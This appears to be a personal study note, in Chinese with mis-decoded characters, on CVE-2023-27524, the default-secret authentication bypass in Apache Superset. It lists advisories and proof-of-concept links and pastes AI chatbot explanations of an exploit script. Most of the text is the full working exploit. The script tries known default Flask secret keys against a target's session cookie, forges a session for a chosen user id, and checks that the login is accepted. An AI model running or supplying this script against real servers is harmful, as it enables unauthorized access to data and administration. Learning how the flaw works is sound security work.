# èº«ä»½è®¤è¯ç»•è¿‡\_ApacheSuperset_CVE-2023-27524

- [æ¼æ´å‘ç°å›¢é˜Ÿ horizon3ai çš„æŠ¥å‘Š](https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/)
- [Freebuf](https://www.freebuf.com/vuls/369911.html)
- [Apache Superset å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´(CVE-2023-27524)è¯¦ç»†åˆ©ç”¨è¿‡ç¨‹](https://blog.csdn.net/nnn2188185/article/details/130478979)
- Github ä¸Šçš„ä¸€äº› poc
  - [horizon3ai/CVE-2023-27524](https://github.com/horizon3ai/CVE-2023-27524)
  - [Okaytc/Superset_auth_bypass_check](https://github.com/Okaytc/Superset_auth_bypass_check)
  - [TardC/CVE-2023-27524](https://github.com/TardC/CVE-2023-27524)
  - [antx-code/CVE-2023-27524](https://github.com/antx-code/CVE-2023-27524)
  - [Pari-Malam/CVE-2023-27524](https://github.com/Pari-Malam/CVE-2023-27524)
  - [MaanVader/CVE-2023-27524-POC](https://github.com/MaanVader/CVE-2023-27524-POC)

---

TODO: éœ€è¦å†è¯»è¯»ä»£ç 

---

bing

æ‚¨å¥½ï¼Œè¿™æ˜¯ Bingã€‚æˆ‘å¯ä»¥å¸®æ‚¨é€è¡Œè§£é‡Šä¸€ä¸‹å…·ä½“ä»£ç çš„ä½œç”¨ã€‚ğŸ˜Š

è¿™æ®µä»£ç æ˜¯ç”¨ Python è¯­è¨€ç¼–å†™çš„ï¼Œå®ƒä½¿ç”¨äº† flask_unsign, requests, urllib3, argparse, re, time ç­‰æ¨¡å—ï¼Œåˆ†åˆ«ç”¨äºç ´è§£å’Œä¼ªé€  session cookieï¼Œå‘é€ HTTP è¯·æ±‚ï¼Œå¿½ç•¥ HTTPS è­¦å‘Šï¼Œè§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œè¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œæ§åˆ¶æ—¶é—´ç­‰ã€‚è¿™æ®µä»£ç çš„ç›®çš„æ˜¯åˆ©ç”¨ flask_unsign æ¨¡å—æ¥ç ´è§£å’Œä¼ªé€  Apache Superset çš„ session cookieï¼Œä»è€Œç»•è¿‡èº«ä»½éªŒè¯ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´åˆ©ç”¨ã€‚è¿™æ®µä»£ç æ˜¯é’ˆå¯¹ CVE-2023-27524 è¿™ä¸ªæ¼æ´ç¼–å†™çš„ï¼Œè¯¥æ¼æ´æ˜¯ç”±äº Apache Superset ä½¿ç”¨äº†ä¸å®‰å…¨çš„é»˜è®¤é…ç½®è€Œå¯¼è‡´çš„èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ Â¹ã€‚

å…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç çš„é€»è¾‘å¦‚ä¸‹ï¼š

```python
# å¯¼å…¥æ‰€éœ€çš„æ¨¡å—
from flask_unsign import session
import requests
import urllib3
import argparse
import re
from time import sleep

# å¿½ç•¥HTTPSè­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# å®šä¹‰ä¸€ä¸ªSECRET_KEYSåˆ—è¡¨ï¼Œé‡Œé¢å­˜æ”¾äº†ä¸€äº›å¯èƒ½è¢«Apache Supersetä½¿ç”¨çš„é»˜è®¤å¯†é’¥ï¼Œç”¨äºç ´è§£session cookie
SECRET_KEYS = [
    b"\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h",  # version < 1.4.1
    b"CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",  # version >= 1.4.1
    b"thisISaSECRET_1234",  # deployment template
    b"YOUR_OWN_RANDOM_GENERATED_SECRET_KEY",  # documentation
    b"TEST_NON_DEV_SECRET",  # docker compose
]

# å®šä¹‰ä¸€ä¸ªmainå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸»è¦çš„é€»è¾‘
def main():
    # åˆ›å»ºä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°è§£æå™¨ï¼Œç”¨äºæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼ŒåŒ…æ‹¬ç›®æ ‡URL(å¿…é¡») ï¼Œç”¨æˆ·ID(å¯é€‰ï¼Œé»˜è®¤ä¸º1) ï¼Œæ˜¯å¦éªŒè¯ç™»å½•(å¯é€‰ï¼Œé»˜è®¤ä¸ºå¦) ï¼Œç­‰å¾…æ—¶é—´(å¯é€‰ï¼Œé»˜è®¤ä¸º5ç§’) ç­‰
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--url", "-u", help="Base URL of Superset instance", required=True
    )
    parser.add_argument(
        "--id",
        help="User ID to forge session cookie for, default=1",
        required=False,
        default="1",
    )
    parser.add_argument(
        "--validate", "-v", help="Validate login", required=False, action="store_true"
    )
    parser.add_argument(
        "--timeout",
        "-t",
        help="Time to wait before using forged session cookie, default=5s",
        required=False,
        type=int,
        default=5,
    )
    args = parser.parse_args()

    # å°è¯•è®¿é—®ç›®æ ‡URLçš„ç™»å½•é¡µé¢ï¼Œå¹¶è·å–è¿”å›çš„session cookieã€‚å¦‚æœæ²¡æœ‰è·å–åˆ°session cookieæˆ–è€…session cookieä¸æ˜¯Flaskç±»å‹çš„ï¼Œåˆ™æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºã€‚
    try:
        u = args.url.rstrip("/") + "/login/"

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
        }

        resp = requests.get(
            u, headers=headers, verify=False, timeout=30, allow_redirects=False
        )
        if resp.status_code != 200:
            print(
                f"Error retrieving login page at {u}, status code: {resp.status_code}"
            )
            return

        session_cookie = None
        for c in resp.cookies:
            if c.name == "session":
                session_cookie = c.value
                break

        if not session_cookie:
            print("Error: No session cookie found")
            return

        print(f"Got session cookie: {session_cookie}")

        # å°è¯•è§£ç session cookieï¼Œå¹¶æ‰“å°å‡ºæ¥ã€‚åŒæ—¶ï¼Œå°è¯•ä»è¿”å›çš„é¡µé¢ä¸­åŒ¹é…å‡ºSupersetçš„ç‰ˆæœ¬å·ï¼Œå¹¶æ‰“å°å‡ºæ¥ã€‚
        try:
            decoded = session.decode(session_cookie)
            print(f"Decoded session cookie: {decoded}")
        except:
            print("Error: Not a Flask session cookie")
            return

        match = re.search(r"&#34;version_string&#34;: &#34;(.*?)&#34", resp.text)
        if match:
            version = match.group(1)
        else:
            version = "Unknown"

        print(f"Superset Version: {version}")

        # éå†SECRET_KEYSåˆ—è¡¨ä¸­çš„æ¯ä¸€ä¸ªå¯†é’¥ï¼Œå°è¯•ç”¨flask_unsignæ¨¡å—çš„verifyå‡½æ•°æ¥éªŒè¯session cookieæ˜¯å¦å¯ä»¥è¢«ç ´è§£ã€‚å¦‚æœå¯ä»¥ï¼Œåˆ™æ‰“å°å‡ºæˆåŠŸç ´è§£çš„ä¿¡æ¯å’Œä½¿ç”¨çš„å¯†é’¥ï¼Œå¹¶è·³å‡ºå¾ªç¯ã€‚å¦‚æœä¸å¯ä»¥ï¼Œåˆ™æ‰“å°å‡ºå¤±è´¥ç ´è§£çš„ä¿¡æ¯å¹¶é€€å‡ºã€‚
        for i, k in enumerate(SECRET_KEYS):
            cracked = session.verify(session_cookie, k)
            if cracked:
                break

        if not cracked:
            print("Failed to crack session cookie")
            return

        print(f"Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}")

        # æ ¹æ®ç”¨æˆ·è¾“å…¥çš„IDå‚æ•°(å¦‚æœä¸æ˜¯æ•´æ•°ï¼Œåˆ™åŸæ ·ä½¿ç”¨) ï¼Œç”¨flask_unsignæ¨¡å—çš„signå‡½æ•°æ¥ä¼ªé€ ä¸€ä¸ªæ–°çš„session cookieï¼Œå¹¶æ‰“å°å‡ºæ¥ã€‚
        try:
            user_id = int(args.id)
        except:
            user_id = args.id

        forged_cookie = session.sign({"_user_id": user_id, "user_id": user_id}, k)
        print(f"Forged session cookie for user {user_id}: {forged_cookie}")

        # å¦‚æœç”¨æˆ·è¾“å…¥äº†éªŒè¯ç™»å½•çš„å‚æ•°ï¼Œåˆ™å°è¯•ä½¿ç”¨ä¼ªé€ çš„session cookieè®¿é—®ç›®æ ‡URLçš„ç™»å½•é¡µé¢ï¼Œå¹¶æ£€æŸ¥è¿”å›çš„çŠ¶æ€ç æ˜¯å¦ä¸º302(è¡¨ç¤ºé‡å®šå‘) ã€‚å¦‚æœæ˜¯ï¼Œåˆ™æ‰“å°å‡ºæˆåŠŸéªŒè¯ç™»å½•çš„ä¿¡æ¯ã€‚å¦‚æœä¸æ˜¯ï¼Œåˆ™æ‰“å°å‡ºå¤±è´¥éªŒè¯ç™»å½•çš„ä¿¡æ¯ï¼Œå¹¶å»ºè®®é‡æ–°æ£€æŸ¥ç”¨æˆ·IDã€‚å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™æ‰“å°å‡ºå¼‚å¸¸ä¿¡æ¯ã€‚
        if args.validate:
            validated = False
            try:
                headers["Cookie"] = f"session={forged_cookie}"
                print(
                    f"Sleeping {args.timeout} seconds before using forged cookie to account for time drift..."
                )
                sleep(args.timeout)
                resp = requests.get(
                    u, headers=headers, verify=False, timeout=30, allow_redirects=False
                )
                if resp.status_code == 302:
                    print(
                        f"Got 302 on login, forged cookie appears to have been accepted"
                    )
                    validated = True
                else:
                    print(
                        f"Got status code {resp.status_code} on login instead of expected redirect 302. Forged cookie does not appear to be valid. Re-check user id."
                    )
            except Exception as e_inner:
                print(
                    f"Exception occurred while validating login: {e_inner}"
                )
```

å¸Œæœ›è¿™äº›ä¿¡æ¯å¯¹æ‚¨æœ‰å¸®åŠ©ã€‚å¦‚æœæ‚¨è¿˜æœ‰å…¶ä»–é—®é¢˜ï¼Œæ¬¢è¿ç»§ç»­ä¸æˆ‘äº¤æµã€‚ğŸ˜Š

Â¹: [CVE-2023-27524](^1^)

æº: ä¸å¿…åº”çš„å¯¹è¯ï¼Œ 2023/8/18
(1) çœ‹ä¸æ‡‚ä»£ç ï¼Ÿè®© AI æ¥å¸®ä½ ç¿»è¯‘ï¼| Github Copilot Labs - æ˜é‡‘. https://juejin.cn/post/7081301239593435149.
(2) çœ‹ä¸æ‡‚ä»£ç ï¼Ÿè®© AI æ¥å¸®ä½ ç¿»è¯‘ï¼| Github Copilot Labs - æ˜é‡‘. https://juejin.cn/post/7081301239593435149.
(3) çœ‹ä¸æ‡‚ä»£ç æ€ä¹ˆåŠï¼Ÿæœ‰æ²¡æœ‰å¯ä»¥è§£é‡Šä»£ç æˆ–è€…å…¶ä»–æ–¹æ³•å¯ä»¥çœ‹æ‡‚ .... https://www.zhihu.com/question/369988824.
(4) mapreduce å®ä¾‹ä»£ç è¯¦è§£(ä¸€è¡Œä¸€è¡Œçš„æ³¨é‡Š)  - CSDN åšå®¢. https://blog.csdn.net/qq_44823756/article/details/111758706.
(5) æ·±åº¦å­¦ä¹ ä»£ç æœ‰æ•‘äº†ï¼æˆ‘å‘ç°äº†ä¸€ä¸ªé€è¡Œè§£è¯»ä»£ç çš„ç½‘ç«™ .... https://www.bilibili.com/video/BV1M94y1B7qX/.

---

ChatGPT

å½“ç„¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­è§£é‡Šä»£ç çš„æ¯ä¸€è¡Œã€‚

```python
        u = args.url.rstrip("/") + "/login/"

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
        }

        resp = requests.get(
            u, headers=headers, verify=False, timeout=30, allow_redirects=False
        )
        if resp.status_code != 200:
            print(
                f"Error retrieving login page at {u}, status code: {resp.status_code}"
            )
            return
```

è¿™æ®µä»£ç ä¸»è¦ç”¨äºè·å– Superset ç™»å½•é¡µé¢ã€‚

- `u = args.url.rstrip("/") + "/login/"`: æ„å»º Superset ç™»å½•é¡µé¢çš„ URLï¼Œ`rstrip("/")` æ˜¯ä¸ºäº†ç¡®ä¿ URL æœ«å°¾æ²¡æœ‰æ–œæ ã€‚

- `headers = { ... }`: åˆ›å»ºä¸€ä¸ª HTTP è¯·æ±‚å¤´ï¼Œæ¨¡æ‹Ÿä¸€ä¸ªç”¨æˆ·ä»£ç†ä¸º Mozilla Firefox çš„è¯·æ±‚ã€‚

- `resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)`: å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ°æ„å»ºçš„ URLï¼Œä½¿ç”¨å®šä¹‰çš„è¯·æ±‚å¤´ã€‚`verify=False` ç¦ç”¨äº† SSL è¯ä¹¦éªŒè¯ï¼Œ`timeout=30` è®¾ç½®äº†è¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼Œ`allow_redirects=False` ç¦æ­¢äº†é‡å®šå‘ã€‚

- `if resp.status_code != 200:`: å¦‚æœå“åº”çš„çŠ¶æ€ç ä¸æ˜¯ 200(å³æˆåŠŸ) ï¼Œåˆ™è¾“å‡ºé”™è¯¯æ¶ˆæ¯ï¼Œå¹¶ä¸­æ­¢ç¨‹åºè¿è¡Œã€‚

```python
        session_cookie = None
        for c in resp.cookies:
            if c.name == "session":
                session_cookie = c.value
                break

        if not session_cookie:
            print("Error: No session cookie found")
            return

        print(f"Got session cookie: {session_cookie}")

        try:
            decoded = session.decode(session_cookie)
            print(f"Decoded session cookie: {decoded}")
        except:
            print("Error: Not a Flask session cookie")
            return
```

è¿™éƒ¨åˆ†ä»£ç ç”¨äºæå–ä¼šè¯ Cookie å¹¶å¯¹å…¶è¿›è¡Œè§£ç ã€‚

- `session_cookie = None`: åˆå§‹åŒ–ä¼šè¯ Cookie å˜é‡ã€‚

- `for c in resp.cookies: ...`: éå†å“åº”çš„ Cookieï¼Œæ‰¾åˆ°åä¸º "session" çš„ Cookieï¼Œæå–å…¶å€¼å¹¶å­˜å‚¨åœ¨ `session_cookie` å˜é‡ä¸­ã€‚

- `if not session_cookie:`: å¦‚æœæ²¡æœ‰æ‰¾åˆ°ä¼šè¯ Cookieï¼Œåˆ™è¾“å‡ºé”™è¯¯æ¶ˆæ¯ï¼Œå¹¶ä¸­æ­¢ç¨‹åºè¿è¡Œã€‚

- `print(f"Got session cookie: {session_cookie}")`: è¾“å‡ºè·å–åˆ°çš„ä¼šè¯ Cookieã€‚

- `try: ...`: å°è¯•å¯¹ä¼šè¯ Cookie è¿›è¡Œè§£ç ã€‚

- `decoded = session.decode(session_cookie)`: ä½¿ç”¨ä¹‹å‰å¯¼å…¥çš„ `flask_unsign` æ¨¡å—çš„ `decode` å‡½æ•°è§£ç ä¼šè¯ Cookieã€‚

- `print(f"Decoded session cookie: {decoded}")`: è¾“å‡ºè§£ç åçš„ä¼šè¯ Cookieã€‚

- `except: ...`: å¦‚æœè§£ç å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯æ¶ˆæ¯ï¼Œå¹¶ä¸­æ­¢ç¨‹åºè¿è¡Œã€‚
